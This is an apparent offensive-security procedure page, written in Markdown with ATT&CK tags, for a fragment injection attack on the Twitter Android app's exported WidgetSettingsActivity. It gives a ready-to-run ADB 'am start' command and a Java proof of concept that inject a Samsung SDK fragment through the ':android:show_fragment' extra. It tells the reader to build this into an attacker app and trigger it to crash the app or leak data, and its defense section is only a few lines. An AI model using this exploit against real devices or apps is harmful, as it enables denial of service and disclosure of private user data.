---
id: proc-craft-intent-fragment-injection
tags:
  - fragment-injection
  - android
  - intent
  - exploit
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/adb-am-start]]'
  - '[[commands/test-twitter-fragment-injection]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
  - '[[Compromise Client Software Binary]]'
updated_at: '2025-12-14T17:24:39.305Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
  - '[[Compromise Client Software Binary]]'
---
# Craft Malicious Intent for Fragment Injection

## Summary

This procedure crafts and sends a malicious Intent to the Twitter app's WidgetSettingsActivity, injecting an arbitrary fragment (e.g., from Samsung SDK) to cause crashes or disclose private information. It exploits the lack of validation on the ':android:show_fragment' extra in the exported PreferenceActivity.

## Description

Fragment Injection occurs when an exported PreferenceActivity allows external intents to specify internal fragments without checks, a known Android framework flaw. Attackers target com.twitter.android.WidgetSettingsActivity with a crafted Intent using setClassName and putExtra for the fragment class. This can invoke unintended code paths, leading to denial-of-service or data leaks. Requires ADB or an attacker app on the device. Outcomes include app instability or exposure of internal app data.

## Requirements

1. ADB access to target Android device with Twitter app
2. Knowledge of target fragment classes (e.g., com.samsung.android.sdk.pen.objectruntime.preload.VideoIntentFragment)
3. Android emulator or physical device for testing

## Defense

Defensive measures and detection strategies:

- Patch PreferenceActivity usage or add extra validation in app code
- Use android:exported="false" or custom intent filters
- Detect anomalous intents via runtime monitoring or SELinux policies

## Objectives

1. Load arbitrary fragment into WidgetSettingsActivity
2. Trigger crash or info disclosure without root
3. Demonstrate vulnerability impact

## Instructions

### Step 1: Prepare Intent via ADB Shell

**Context**: Use ADB to simulate the malicious intent without a custom app.

**Command** ([[commands/adb-am-start]]):
```bash
adb shell am start -n com.twitter.android/.WidgetSettingsActivity --esa ":android:show_fragment" com.samsung.android.sdk.pen.objectruntime.preload.VideoIntentFragment --ez confirmcredentials false --fi Intent.FLAG_ACTIVITY_CLEAR_TASK
```

> This starts the activity with extras. Expected output: Activity launches, but crashes due to incompatible fragment.

### Step 2: Execute PoC Code in Android Context

**Context**: Run the Java PoC in an Android app or script to invoke the intent programmatically.

**Command** ([[commands/test-twitter-fragment-injection]]):
```java
private void testtwitter() {
    Intent i = new Intent();
    i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
    i.setClassName("com.twitter.android", "com.twitter.android.WidgetSettingsActivity");
    i.putExtra(":android:show_fragment", "com.samsung.android.sdk.pen.objectruntime.preload.VideoIntentFragment");
    // i.putExtra("confirmcredentials", false);
    startActivity(i);
}
```

> Integrate into an attacker app and trigger. Monitor with `adb logcat` for errors like ClassNotFoundException or NullPointerException indicating successful injection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Collection]] Collection

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution
- [[Compromise Client Software Binary]] Compromise Client Software Binary

### Sub-Techniques


## Commands Used

- [[commands/adb-am-start]]
- [[commands/test-twitter-fragment-injection]]

## Tools Used


## Tags

- fragment-injection
- android
- intent
- exploit
